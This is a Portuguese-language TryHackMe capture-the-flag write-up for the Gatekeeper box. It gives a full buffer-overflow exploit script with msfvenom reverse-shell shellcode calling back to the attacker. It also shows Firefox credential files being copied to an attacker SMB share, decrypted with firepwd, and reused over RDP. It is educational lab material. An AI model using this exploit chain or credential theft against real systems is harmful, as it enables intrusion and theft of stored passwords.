# Gatekeeper — TryHackMe Writeup

**Categoria:** Buffer Overflow / Privilege Escalation  
**Dificuldade:** Médio  
**Objetivo:** Explorar um serviço vulnerável a Buffer Overflow para obter acesso inicial, e escalar privilégios via credenciais salvas no Firefox.

---

## Reconhecimento

### Nmap

```bash
nmap 10.66.132.48 -sC -sV -p- --min-rate 5000
```

**Portas relevantes:**

| Porta | Serviço |
|---|---|
| 139/445 | SMB (Windows 7 SP1) |
| 3389 | RDP |
| 31337 | Serviço customizado (ecoa input) |

O serviço na porta **31337** chama atenção imediata: ele responde "Hello" para qualquer input recebido — comportamento típico de aplicação vulnerável a Buffer Overflow.

---

## Fase 1 — Buffer Overflow na porta 31337

### Obtenção do binário

O serviço na porta 31337 é servido pelo `gatekeeper.exe`, disponível via SMB:

```bash
smbclient -L //10.66.132.48 -N
smbclient //10.66.132.48/Users -N
# cd Share
# get gatekeeper.exe
```

### Execução local para debugging

```bash
WINEARCH=win32 WINEPREFIX=~/.wine32 wine gatekeeper.exe
```

### Fuzzing — identificando o crash

Enviando um payload grande para identificar o crash:

```bash
python3 -c "print('A' * 200)" | nc 127.0.0.1 31337
```

O serviço encerra a conexão — confirmando Buffer Overflow.

### Encontrando o offset

Gerar um padrão único com o Metasploit:

```bash
msf-pattern_create -l 200
```

Enviar o padrão, verificar o valor do EIP no debugger (edb), e calcular o offset:

```bash
msf-pattern_offset -l 200 -q 39654138
# [*] Exact match at offset 146
```

**Offset: 146 bytes**

### Verificando controle do EIP

```python
payload = b"A" * 146 + b"B" * 4 + b"C" * 50
```

EIP = `42424242` (`BBBB`) — controle total confirmado.

### Encontrando JMP ESP

```bash
ropper --file /tmp/gatekeeper.exe --search "jmp esp"
# 0x080414c3: jmp esp;
```

### Gerando o shellcode

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<TUN0_IP> LPORT=4444 \
  -b "\x00\x0a\x0d" -f python EXITFUNC=thread
```

> **Nota:** os bad chars `\x0a` e `\x0d` (newline e carriage return) são críticos — o serviço usa `\r\n` como delimitador, o que corromperia o shellcode.

### Exploit final

```python
import socket
import struct

ip = "10.66.132.48"
port = 31337

offset = 146
jmp_esp = struct.pack("<I", 0x080414c3)
nop_sled = b"\x90" * 16

buf = b""  # shellcode gerado pelo msfvenom

payload = b"A" * offset + jmp_esp + nop_sled + buf

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
s.send(payload + b"\r\n")
s.close()
```

### Listener

```bash
nc -lvnp 4444
```

**Shell obtido como:** `gatekeeper\natbat`

**User Flag:** encontrada em `C:\Users\natbat\Desktop\user.txt.txt`

---

## Fase 2 — Privilege Escalation via Firefox

### Identificando o vetor

O Firefox estava instalado em `C:\Program Files (x86)\Mozilla Firefox\`. Navegadores armazenam credenciais localmente — vetor clássico de privesc no Windows.

### Extraindo os arquivos do perfil

```cmd
dir "C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\"
```

Perfil relevante: `ljfn812a.default-release`

Arquivos necessários: `key4.db` e `logins.json`

### Exfiltrando via SMB

No Kali:
```bash
impacket-smbserver share /tmp -smb2support
```

Na vítima:
```cmd
copy "C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\key4.db" \\<KALI_IP>\share\key4.db
copy "C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\logins.json" \\<KALI_IP>\share\logins.json
```

### Descriptografando com firepwd

```bash
git clone https://github.com/lclevy/firepwd.git
cd firepwd
pip install -r requirements.txt --break-system-packages

mkdir /tmp/firefox_profile
cp /tmp/key4.db /tmp/firefox_profile/
cp /tmp/logins.json /tmp/firefox_profile/

python3 firepwd.py -d /tmp/firefox_profile
```

**Credenciais encontradas:**
```
https://creds.com | username: mayor | password: 8CL7O1N78MdrCIsV
```

### Acesso via RDP

```bash
xfreerdp /u:mayor /p:8CL7O1N78MdrCIsV /v:10.66.132.48 /cert:ignore /sec:rdp
```

**Root Flag:** encontrada no Desktop do usuário `mayor`.

**Flag:** `{Th3_M4y0r_C0ngr4tul4t3s_U}`

---

## Lições aprendidas

- **Buffer Overflow clássico** em Windows 7: sem ASLR/DEP efetivo, o endereço do `JMP ESP` é estático e confiável.
- **Bad chars** são críticos — não basta excluir `\x00`. Sempre analise o protocolo do serviço para identificar delimitadores que podem corromper o payload.
- **EXITFUNC=thread** evita que o crash do processo pai mate o shell.
- **Credenciais salvas em navegadores** são um vetor de privesc frequentemente negligenciado — o Firefox armazena senhas criptografadas localmente e ferramentas como `firepwd` quebram essa proteção facilmente.
- **firepwd** é mais confiável que o `firefox_decrypt` em ambientes sem Firefox instalado localmente (sem dependência de NSS).

---

## Ferramentas utilizadas

| Ferramenta | Uso |
|---|---|
| Nmap | Reconhecimento de portas e serviços |
| smbclient | Enumeração e download via SMB |
| Wine | Execução local do binário Windows |
| edb-debugger | Análise do crash e controle do EIP |
| msf-pattern_create/offset | Cálculo do offset |
| ropper | Busca de gadgets ROP (JMP ESP) |
| msfvenom | Geração de shellcode |
| impacket-smbserver | Exfiltração de arquivos via SMB |
| firepwd | Descriptografia de credenciais do Firefox |
| xfreerdp | Acesso RDP com as credenciais obtidas |
